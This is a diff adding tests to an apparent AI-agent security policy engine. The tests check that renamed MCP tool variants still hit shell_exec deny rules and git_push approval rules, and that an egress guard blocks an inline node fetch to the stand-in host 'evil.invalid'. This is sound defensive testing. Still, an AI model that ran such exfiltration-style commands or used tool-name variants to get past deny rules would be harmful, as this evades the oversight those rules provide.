@@ -775,6 +775,78 @@ guards:
     expect(decision.reason_code).toBe("OCLAW_TOOL_APPROVAL_REQUIRED");
   });
 
+  it("canonicalizes MCP tool names before default-allow deny rules", async () => {
+    const policyPath = join(testDir, "mcp-canonical-deny-policy.yaml");
+    writeFileSync(
+      policyPath,
+      `
+version: "clawdstrike-v1.0"
+tools:
+  denied:
+    - shell_exec
+  default_action: allow
+`,
+    );
+
+    const engine = new PolicyEngine({
+      policy: policyPath,
+      mode: "deterministic",
+      logLevel: "error",
+    });
+
+    for (const toolName of ["ShellExec", "shell-exec", "shell.exec", "mcp__terminal__shell_exec"]) {
+      const decision = await engine.evaluate({
+        eventId: `mcp-canonical-deny-${toolName}`,
+        eventType: "tool_call",
+        timestamp: new Date().toISOString(),
+        data: {
+          type: "tool",
+          toolName,
+          parameters: {},
+        },
+      });
+      expect(decision.status).toBe("deny");
+      expect(decision.guard).toBe("mcp_tool");
+      expect(decision.reason_code).toBe("OCLAW_TOOL_DENIED");
+    }
+  });
+
+  it("canonicalizes MCP tool names before default-allow approval rules", async () => {
+    const policyPath = join(testDir, "mcp-canonical-approval-policy.yaml");
+    writeFileSync(
+      policyPath,
+      `
+version: "clawdstrike-v1.0"
+tools:
+  require_confirmation:
+    - git_push
+  default_action: allow
+`,
+    );
+
+    const engine = new PolicyEngine({
+      policy: policyPath,
+      mode: "deterministic",
+      logLevel: "error",
+    });
+
+    for (const toolName of ["GitPush", "git-push", "git.push", "mcp__git__git_push"]) {
+      const decision = await engine.evaluate({
+        eventId: `mcp-canonical-approval-${toolName}`,
+        eventType: "tool_call",
+        timestamp: new Date().toISOString(),
+        data: {
+          type: "tool",
+          toolName,
+          parameters: {},
+        },
+      });
+      expect(decision.status).toBe("deny");
+      expect(decision.guard).toBe("mcp_tool");
+      expect(decision.reason_code).toBe("OCLAW_TOOL_APPROVAL_REQUIRED");
+    }
+  });
+
   it("enforces allowed_write_roots for output-style command flags", async () => {
     const policyPath = join(testDir, "policy.yaml");
     writeFileSync(
@@ -867,6 +939,20 @@ guards:
     const deniedDecision = await engine.evaluate(deniedEvent);
     expect(deniedDecision.status).toBe("deny");
     expect(deniedDecision.guard).toBe("egress");
+
+    const embeddedDeniedEvent: PolicyEvent = {
+      eventId: "command-embedded-egress-deny",
+      eventType: "command_exec",
+      timestamp: new Date().toISOString(),
+      data: {
+        type: "command",
+        command: "node",
+        args: ["-e", "fetch('https://evil.invalid/inline')"],
+      },
+    };
+    const embeddedDeniedDecision = await engine.evaluate(embeddedDeniedEvent);
+    expect(embeddedDeniedDecision.status).toBe("deny");
+    expect(embeddedDeniedDecision.guard).toBe("egress");
   });
 
   it("enforces egress allowlists for socket-style command targets", async () => {
